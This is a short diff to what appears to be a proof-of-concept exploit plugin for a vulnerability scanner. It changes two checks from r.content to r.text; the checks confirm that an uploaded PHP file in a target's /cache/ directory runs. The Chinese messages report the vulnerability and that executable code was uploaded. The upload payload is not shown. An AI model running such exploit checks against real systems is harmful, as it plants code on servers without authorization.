@@ -56,7 +56,7 @@ class Poc(ABPoc):
             verify_url = self.target + '/cache/{num}.php'.format(num=randstr)
             r = requests.get(verify_url)
 
-            if r.status_code == 200 and 'c4ca4238a0b923820dcc509a6f75849b' in r.content:
+            if r.status_code == 200 and 'c4ca4238a0b923820dcc509a6f75849b' in r.text:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
 
@@ -77,7 +77,7 @@ class Poc(ABPoc):
             verify_url = self.target + '/cache/{num}.php'.format(num=randstr)
             r = requests.get(verify_url)
 
-            if r.status_code == 200 and 'c4ca4238a0b923820dcc509a6f75849b' in r.content:
+            if r.status_code == 200 and 'c4ca4238a0b923820dcc509a6f75849b' in r.text:
                 self.output.report(self.vuln, '发现{target}存在{vulnname}漏洞，已在cache目录下上传可执行代码页面：{verify_url}'.format(
                     target=self.target, vulnname=self.vuln.name, verify_url=verify_url))
 
